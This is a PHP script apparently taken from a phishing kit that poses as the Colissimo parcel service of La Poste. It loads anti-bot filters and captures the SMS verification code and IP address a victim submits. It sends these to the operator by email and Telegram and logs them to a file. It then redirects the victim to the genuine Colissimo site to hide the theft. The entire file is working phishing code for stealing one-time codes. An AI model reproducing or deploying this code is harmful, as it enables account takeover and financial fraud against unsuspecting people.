<?php
	require_once "bots/antibots1.php";
	require_once "bots/antibots2.php";
	require_once "bots/antibots3.php";
	require_once "bots/antibots4.php";
	require_once "bots/antibots5.php";
	require_once "bots/antibots6.php";
?>
<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------- MOBILE NEWW-----------------\n";
$message .= "-----------------Info----------------------\n";
$message .= " SMS2               : ".$_POST['sms2']."\n";
$message .= "------------------Info D'IP-------------------------\n";
$message .= "IP                : $ip\n";
$message .= "--------------- ---------------\n";

include '../tlgrm.php';	
$sen = "$send";

$subject = "COLISSIMO ~ $ip";

$from .= "From: Mobile Neww ~<Troj>\n";
$from .= "To:";

mail($sen,$subject,$message,$from);
telegram($message);

$file = fopen("../../alog00.txt","a");
fwrite($file,$message); 

echo '<script language="Javascript">
<!--
document.location.replace("https://www.laposte.fr/colissimo");
// -->
</script>';
?>